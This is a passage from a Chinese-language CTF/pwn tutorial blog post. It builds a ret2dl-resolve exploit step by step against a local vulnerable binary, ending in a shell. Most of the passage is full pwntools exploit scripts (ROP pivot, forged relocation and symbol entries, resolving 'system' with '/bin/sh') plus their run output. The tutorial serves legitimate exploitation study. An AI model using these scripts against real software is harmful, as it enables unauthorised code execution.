class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt ./bof</span></span><br><span class="line">index_offset = <span class="number">0x20</span></span><br><span class="line">payload = flat([</span><br><span class="line">	plt_0,</span><br><span class="line">	index_offset,</span><br><span class="line">	<span class="number">0xdeadbeef</span>,</span><br><span class="line">	<span class="number">1</span>, buf + <span class="number">80</span>, len(cmd)</span><br><span class="line">])</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">100</span>, <span class="string">'A'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>最后同样也是输出<code>/bin/sh</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">λ ./exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./bof'</span>: pid 7270</span><br><span class="line">[*] <span class="string">'/home/assassinq/Desktop/ret2dl-resolve/bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">/bin/sh[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h2 id="Step-Three"><a href="#Step-Three" class="headerlink" title="Step Three"></a>Step Three</h2><p>接下来我们在<code>.bss</code>上构造假的<code>reloc</code>，并让<code>dl-runtime.c</code>来解析：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ebp_ret = g(<span class="string">'pop ebp ; ret'</span>)</span><br><span class="line">leave_ret = g(<span class="string">'leave ; ret'</span>)</span><br><span class="line">bss = <span class="number">0x0804a040</span> <span class="comment"># readelf -S ./bof | grep ".bss"</span></span><br><span class="line">buf = bss + <span class="number">0x800</span></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x08048629</span> <span class="comment"># ROPgadget --binary ./bof --only "pop|ret"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">p.recvuntil(<span class="string">'Return to dl_runtime_resolve!'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line">	<span class="string">'A'</span> * offset,</span><br><span class="line">	read_plt,</span><br><span class="line">	pop_pop_pop_ret,</span><br><span class="line">	<span class="number">0</span>, buf, <span class="number">100</span>,</span><br><span class="line">	pop_ebp_ret,</span><br><span class="line">	buf - <span class="number">4</span>,</span><br><span class="line">	leave_ret</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt ./bof</span></span><br><span class="line">rel_plt = <span class="number">0x8048330</span> <span class="comment"># objdump -s -j .rel.plt ./bof</span></span><br><span class="line">index_offset = (buf + <span class="number">24</span>)- rel_plt</span><br><span class="line">r_info = <span class="number">0x607</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">payload = flat([</span><br><span class="line">	plt_0,</span><br><span class="line">	index_offset,</span><br><span class="line">	<span class="number">0xdeadbeef</span>,</span><br><span class="line">	<span class="number">1</span>, buf + <span class="number">80</span>, len(cmd),</span><br><span class="line">	fake_reloc</span><br><span class="line">])</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">100</span>, <span class="string">'A'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>最后得到相同的结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">λ ./exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./bof'</span>: pid 8237</span><br><span class="line">[*] <span class="string">'/home/assassinq/Desktop/ret2dl-resolve/bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">/bin/sh[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h2 id="Step-Four"><a href="#Step-Four" class="headerlink" title="Step Four"></a>Step Four</h2><p>这一次构造假的<code>.sym</code>，使其指向我们控制的<code>st_name</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ebp_ret = g(<span class="string">'pop ebp ; ret'</span>)</span><br><span class="line">leave_ret = g(<span class="string">'leave ; ret'</span>)</span><br><span class="line">bss = <span class="number">0x0804a040</span> <span class="comment"># readelf -S ./bof | grep ".bss"</span></span><br><span class="line">buf = bss + <span class="number">0x800</span></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x08048629</span> <span class="comment"># ROPgadget --binary ./bof --only "pop|ret"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">p.recvuntil(<span class="string">'Return to dl_runtime_resolve!'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line">	<span class="string">'A'</span> * offset,</span><br><span class="line">	read_plt,</span><br><span class="line">	pop_pop_pop_ret,</span><br><span class="line">	<span class="number">0</span>, buf, <span class="number">100</span>,</span><br><span class="line">	pop_ebp_ret,</span><br><span class="line">	buf - <span class="number">4</span>,</span><br><span class="line">	leave_ret</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt ./bof</span></span><br><span class="line">rel_plt = <span class="number">0x8048330</span> <span class="comment"># objdump -s -j .rel.plt ./bof</span></span><br><span class="line">index_offset = (buf + <span class="number">24</span>)- rel_plt</span><br><span class="line">dynsym = <span class="number">0x080481d8</span> <span class="comment"># readelf -S ./bof | grep ".dynsym"</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span> <span class="comment"># readelf -S ./bof | grep ".dynstr"</span></span><br><span class="line">fake_sym_addr = buf + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = <span class="number">0x4c</span></span><br><span class="line">fake_sym = flat([</span><br><span class="line">	st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span></span><br><span class="line">])</span><br><span class="line">payload = flat([</span><br><span class="line">	plt_0,</span><br><span class="line">	index_offset,</span><br><span class="line">	<span class="number">0xdeadbeef</span>,</span><br><span class="line">	<span class="number">1</span>, buf + <span class="number">80</span>, len(cmd),</span><br><span class="line">	fake_reloc,</span><br><span class="line">	<span class="string">'A'</span> * align,</span><br><span class="line">	fake_sym</span><br><span class="line">])</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">100</span>, <span class="string">'A'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>因为<code>dynsym</code>里的<code>Elf32_Sym</code>结构体都是<code>0x10</code>字节大小，所以这里需要对齐操作；因为<code>Elf32_Sym</code>结构体的大小为<code>0x10</code>，所以要除以<code>0x10</code>才能得到<code>write</code>的<code>dynsym</code>索引号。最后成功运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">λ ./exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./bof'</span>: pid 9736</span><br><span class="line">[*] <span class="string">'/home/assassinq/Desktop/ret2dl-resolve/bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">/bin/sh[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h2 id="Step-Five"><a href="#Step-Five" class="headerlink" title="Step Five"></a>Step Five</h2><p>接下来一步把<code>st_name</code>指向输入的字符串<code>&quot;write&quot;</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ebp_ret = g(<span class="string">'pop ebp ; ret'</span>)</span><br><span class="line">leave_ret = g(<span class="string">'leave ; ret'</span>)</span><br><span class="line">bss = <span class="number">0x0804a040</span> <span class="comment"># readelf -S ./bof | grep ".bss"</span></span><br><span class="line">buf = bss + <span class="number">0x800</span></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x08048629</span> <span class="comment"># ROPgadget --binary ./bof --only "pop|ret"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">p.recvuntil(<span class="string">'Return to dl_runtime_resolve!'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line">	<span class="string">'A'</span> * offset,</span><br><span class="line">	read_plt,</span><br><span class="line">	pop_pop_pop_ret,</span><br><span class="line">	<span class="number">0</span>, buf, <span class="number">100</span>,</span><br><span class="line">	pop_ebp_ret,</span><br><span class="line">	buf - <span class="number">4</span>,</span><br><span class="line">	leave_ret</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt ./bof</span></span><br><span class="line">rel_plt = <span class="number">0x8048330</span> <span class="comment"># objdump -s -j .rel.plt ./bof</span></span><br><span class="line">index_offset = (buf + <span class="number">24</span>)- rel_plt</span><br><span class="line">dynsym = <span class="number">0x080481d8</span> <span class="comment"># readelf -S ./bof | grep ".dynsym"</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span> <span class="comment"># readelf -S ./bof | grep ".dynstr"</span></span><br><span class="line">fake_sym_addr = buf + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr</span><br><span class="line">fake_sym = flat([</span><br><span class="line">	st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span></span><br><span class="line">])</span><br><span class="line">payload = flat([</span><br><span class="line">	plt_0,</span><br><span class="line">	index_offset,</span><br><span class="line">	<span class="number">0xdeadbeef</span>,</span><br><span class="line">	<span class="number">1</span>, buf + <span class="number">80</span>, len(cmd),</span><br><span class="line">	fake_reloc,</span><br><span class="line">	<span class="string">'A'</span> * align,</span><br><span class="line">	fake_sym,</span><br><span class="line">	<span class="string">'write\x00'</span></span><br><span class="line">])</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">100</span>, <span class="string">'A'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>中间<code>stname</code>的位置因为<code>Elf32_Sym</code>的大小为<code>0x10</code>，所以要加<code>0x10</code>。结果成功：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">λ ./exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./bof'</span>: pid 9778</span><br><span class="line">[*] <span class="string">'/home/assassinq/Desktop/ret2dl-resolve/bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">/bin/sh[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h2 id="Step-Six"><a href="#Step-Six" class="headerlink" title="Step Six"></a>Step Six</h2><p>最后一步将<code>write</code>改成<code>system</code>，同时设置一下<code>system</code>的参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ebp_ret = g(<span class="string">'pop ebp ; ret'</span>)</span><br><span class="line">leave_ret = g(<span class="string">'leave ; ret'</span>)</span><br><span class="line">bss = <span class="number">0x0804a040</span> <span class="comment"># readelf -S ./bof | grep ".bss"</span></span><br><span class="line">buf = bss + <span class="number">0x800</span></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x08048629</span> <span class="comment"># ROPgadget --binary ./bof --only "pop|ret"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">p.recvuntil(<span class="string">'Return to dl_runtime_resolve!'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line">	<span class="string">'A'</span> * offset,</span><br><span class="line">	read_plt,</span><br><span class="line">	pop_pop_pop_ret,</span><br><span class="line">	<span class="number">0</span>, buf, <span class="number">100</span>,</span><br><span class="line">	pop_ebp_ret,</span><br><span class="line">	buf - <span class="number">4</span>,</span><br><span class="line">	leave_ret</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt ./bof</span></span><br><span class="line">rel_plt = <span class="number">0x8048330</span> <span class="comment"># objdump -s -j .rel.plt ./bof</span></span><br><span class="line">index_offset = (buf + <span class="number">24</span>)- rel_plt</span><br><span class="line">dynsym = <span class="number">0x080481d8</span> <span class="comment"># readelf -S ./bof | grep ".dynsym"</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span> <span class="comment"># readelf -S ./bof | grep ".dynstr"</span></span><br><span class="line">fake_sym_addr = buf + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr</span><br><span class="line">fake_sym = flat([</span><br><span class="line">	st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span></span><br><span class="line">])</span><br><span class="line">payload = flat([</span><br><span class="line">	plt_0,</span><br><span class="line">	index_offset,</span><br><span class="line">	<span class="number">0xdeadbeef</span>,</span><br><span class="line">	buf + <span class="number">80</span>,</span><br><span class="line">	<span class="number">0xdeadbeef</span>,</span><br><span class="line">	<span class="number">0xdeadbeef</span>,</span><br><span class="line">	fake_reloc,</span><br><span class="line">	<span class="string">'A'</span> * align,</span><br><span class="line">	fake_sym,</span><br><span class="line">	<span class="string">'system\x00'</span></span><br><span class="line">])</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">100</span>, <span class="string">'A'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>成功 Get Shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">λ ./exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./bof'</span>: pid 9948</span><br><span class="line">[*] <span class="string">'/home/assassinq/Desktop/ret2dl-resolve/bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">bof  bof.c  core  exp.py  Makefile  peda-session-bof.txt</span><br><span class="line">$ id</span><br><span class="line">uid=1000(assassinq) gid=1000(assassinq) groups=1000(assassinq),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)</span><br></pre></td></tr></table></figure>
<h1 id="Complement-64-bit"><a href="#Complement-64-bit" class="headerlink" title="Complement: 64 bit"></a>Complement: 64 bit</h1><p>64 位下的利用相较于 32 位下有一些不同，像是一些结构体发生变化，如<code>Elf64_Rela</code>，还有其他的都在<a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">这篇文章</a>中都详细地介绍了</p>
<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br><a href="http://www.inforsec.org/wp/?p=389" target="_blank" rel="noopener">http://www.inforsec.org/wp/?p=389</a><br><a href="http://drops.wooyun.org/binary/14360" target="_blank" rel="noopener">http://drops.wooyun.org/binary/14360</a><br><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://phrack.org/issues/58/4.html#article" target="_blank" rel="noopener">http://phrack.org/issues/58/4.html#article</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>

      
        
	<div id="comment">
		<!-- 来必力City版安装代码 -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
		</div>
		<!-- City版安装代码已完成 -->
	</div>



      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/08/08/使用QEMU-gdb对Linux-Kernel进行调试/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          使用QEMU+gdb对Linux Kernel进行调试
        
      </div>
    </a>
  
  
    <a href="/2019/08/04/渗透测试基础指南/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">渗透测试基础指南</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
